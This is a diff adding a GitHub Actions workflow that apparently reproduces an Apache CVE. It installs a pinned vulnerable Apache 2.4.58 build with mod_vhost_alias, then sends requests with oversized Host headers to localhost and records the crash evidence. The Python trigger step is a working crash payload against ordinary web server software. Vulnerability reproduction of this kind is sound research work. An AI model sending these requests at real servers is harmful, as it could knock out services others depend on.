@@ -1,0 +1,94 @@
+name: apache-cve
+
+on:
+  workflow_dispatch:
+
+jobs:
+  stock:
+    runs-on: ubuntu-24.04-arm
+    timeout-minutes: 30
+    steps:
+      - name: system info
+        run: |
+          mkdir -p results
+          uname -a | tee results/system.txt
+          lscpu | tee -a results/system.txt
+          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
+          (grep -o -E "fpac|pauth" /proc/cpuinfo | sort -u | tee -a results/system.txt) || true
+
+      - name: install vulnerable apache 2.4.58-1ubuntu8
+        run: |
+          set -u
+          sudo apt-get update
+          if ! sudo apt-get install -y --allow-downgrades \
+              apache2=2.4.58-1ubuntu8 apache2-bin=2.4.58-1ubuntu8 \
+              apache2-data=2.4.58-1ubuntu8 apache2-utils=2.4.58-1ubuntu8; then
+            echo "apt pin failed; downloading release debs" | tee results/install-fallback.txt
+            mkdir -p /tmp/apache-debs
+            base=https://ports.ubuntu.com/ubuntu-ports/pool/main/a/apache2
+            for f in \
+              apache2_2.4.58-1ubuntu8_arm64.deb \
+              apache2-bin_2.4.58-1ubuntu8_arm64.deb \
+              apache2-data_2.4.58-1ubuntu8_all.deb \
+              apache2-utils_2.4.58-1ubuntu8_arm64.deb; do
+              curl -fsSL "$base/$f" -o "/tmp/apache-debs/$f"
+            done
+            sudo dpkg -i /tmp/apache-debs/*.deb || true
+            sudo apt-get -f install -y
+          fi
+          dpkg -s apache2-bin | grep -E '^(Package|Version):' | tee results/version.txt
+          sha256sum /usr/lib/apache2/modules/mod_vhost_alias.so | tee -a results/version.txt
+
+      - name: configure prefork + vhost_alias
+        run: |
+          sudo a2dismod mpm_event || true
+          sudo a2enmod mpm_prefork
+          sudo a2enmod vhost_alias
+          sudo mkdir -p /tmp/www
+          sudo tee /etc/apache2/sites-available/000-default.conf >/dev/null <<'EOF'
+          <VirtualHost *:80>
+            ServerName test
+            VirtualDocumentRoot /tmp/www/%0
+            LimitRequestFieldSize 16384
+            <Directory /tmp/www>
+              Require all granted
+            </Directory>
+          </VirtualHost>
+          EOF
+          sudo apache2ctl configtest | tee results/configtest.txt
+          sudo apache2ctl -k start
+          sleep 1
+
+      - name: trigger long Host
+        run: |
+          set -u
+          python3 - <<'PY' | tee results/run.txt
+          import socket
+
+          def req(host, label):
+              s = socket.create_connection(("127.0.0.1", 80), timeout=10)
+              s.sendall(b"GET / HTTP/1.0\r\nHost: " + host + b"\r\n\r\n")
+              try:
+                  d = s.recv(4096)
+                  print(label, "len", len(d), "resp", d[:120])
+              except Exception as e:
+                  print(label, "error", repr(e))
+              s.close()
+
+          req(b"short.example", "baseline")
+          req(b"a" * 9000, "long_label")
+          req(b"a." * 4500, "long_dotted")
+          req(b"short.example", "after")
+          PY
+          sleep 1
+          echo "== processes" | tee -a results/run.txt
+          ps -ef | grep -E 'apache2|httpd' | grep -v grep | tee results/ps.txt || true
+          echo "== error log" | tee -a results/run.txt
+          sudo tail -120 /var/log/apache2/error.log | tee results/error.log || true
+          sudo apache2ctl -k stop || true
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: apache-cve-results
+          path: results/
